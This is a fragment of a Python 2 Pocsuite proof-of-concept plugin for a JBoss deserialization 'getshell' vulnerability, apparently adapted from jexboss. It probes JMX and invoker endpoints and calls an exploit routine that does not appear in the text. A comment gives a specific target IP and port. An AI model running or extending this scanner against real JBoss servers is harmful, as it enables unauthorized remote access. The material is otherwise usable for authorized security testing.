        paths = {"jmx-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
                 "web-console": "/web-console/ServerInfo.jsp",
                 "JMXInvokerServlet": "/invoker/JMXInvokerServlet"}
        step1 = False
        exploit_type = ''
        for i in paths.keys():
            try:
                r = pool.request('HEAD', url + str(paths[i]), redirect=True, headers=headers, timeout=3)
                paths[i] = r.status
                if paths[i] == 200 or paths[i] == 500:
                    step1 = True
                    exploit_type = str(i)
                else:
                    pass
            except Exception:
                paths[i] = 505

        if step1:
            step2 = False
            try:
                step2 = self.auto_exploit(url, exploit_type)
            except Exception, e:
                pass
            return step2
        else:
            return False


    #验证漏洞 pocsuite -r 13-JBoss-serialization-getshell.py -u 1.197.56.123:8087 --verify
    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url

        #如果设置端口则取端口,没有设置则为默认端口
        import re
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = "8087"

        vul_host = _host + ":" + _port
        
        #print vul_host
        try:
          vul_result = self.poc(vul_host)
        except Exception, e:
          vul_result = False
        
        if vul_result:
            #print u"发现漏洞"
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
            result['VerifyInfo']['Payload'] = vul_host + "https://github.com/joaomatosf/jexboss"             
        #print r_content
        #from bs4 import BeautifulSoup
        #soup = BeautifulSoup(r_content,'html.parser')
        #print soup.h1.string
        print '[+]13 poc done'
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        # https://github.com/joaomatosf/jexboss
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(JbossPOC)

